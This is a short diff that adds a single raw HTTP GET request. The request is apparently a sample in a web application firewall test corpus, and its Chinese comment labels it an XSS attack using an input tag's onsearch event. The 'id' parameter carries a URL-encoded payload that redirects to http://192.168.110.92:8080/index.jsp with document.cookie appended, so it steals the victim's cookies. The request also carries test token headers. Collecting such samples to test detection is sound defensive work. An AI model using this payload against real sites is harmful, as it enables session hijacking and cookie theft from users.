@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_input标签_onsearch事件-06506677
+# 攻击载荷利用了HTML中的input标签和onsearch属性，触发location.href向恶意地址发送cookie信息。当提交表单并且输入具有搜索类型属性时触发
+GET /?id=%3Cform%3E%3Cinput%20type=search%20onsearch=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3E%20value=%22Hit%20return%22%20autofocus%3E&bid=hd_tag_m8mv25r4 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25r4
+RM-PRO-Token: 0adfca186b2f1600c64824c71f16143f
+RM-PRO-Time: 1742808502202
+User-Agent: curl/7.83.1
+
